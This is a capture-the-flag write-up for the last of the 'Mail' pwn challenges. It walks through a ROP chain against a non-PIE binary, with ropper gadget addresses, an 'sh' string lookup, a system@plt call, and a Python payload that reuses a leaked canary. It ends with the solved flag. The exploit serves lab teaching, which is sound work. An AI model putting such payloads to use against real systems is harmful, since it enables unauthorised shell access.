# Writeup
The third and final challenge from the Mail series. This time we do not have any libc, only the binary. After running it, there doesn't seem to be any difference, besides the date after logging in. Running `checksec` in GDB reveals that the binary was compiled with `-no-pie` flag, which means that the program will be loaded into the same position each time it is run. With that being said, let's craft our exploit.

We will need:
- pop rdi; ret;
- ret;
- /bin/sh or just sh
- system

Exactly like last time.

The `pop rdi; ret;` and `ret` is straightforward with the only difference that we are loading the binary, not libc.
```
$ ropper
ropper> search pop rdi;
0x0000000000401288: pop rdi; ret;
ropper> search ret;
0x000000000040101a: ret;
```

The `sh` can be found using GDB Enhanced Features' `search-pattern`. Remember, that we have to find it inside the binary, not libc.
```
search-pattern "sh"
...
0x403682 - 0x403684  →   "sh"
...
```

The last item on our list is `system`. Remember the date function? It most probably was called as `system("date")` in the binary. Let's disassemble the `welcome_screen` function.

We indeed can see the call to the `system` referenced by the `.plt` table. We can disassemble this address to get to the `.got` table.
```
0x0000000000401124 <+4>:     bnd jmp QWORD PTR [rip+0x2f0d]        # 0x404038 <system@got.plt>
```

Now we are ready to finish the exploit. We can reuse previous one for the canary and only changed the payload.
```
ret = 0x40101a
gadget = 0x401288
shell = 0x403682
system = 0x401124

payload = b"2\nb\nb\n" 
payload += b'A' * 104
payload += p64(canary) 
payload += b'B' * 8
payload += p64(ret)
payload += p64(gadget)
payload += p64(shell)
payload += p64(system)
```

Sending that we get the shell and read the flag from `chall/flag.txt`

```
CTF{h3_r34lly_d0_83_7h3_0n3_wh0_h4ck5}
```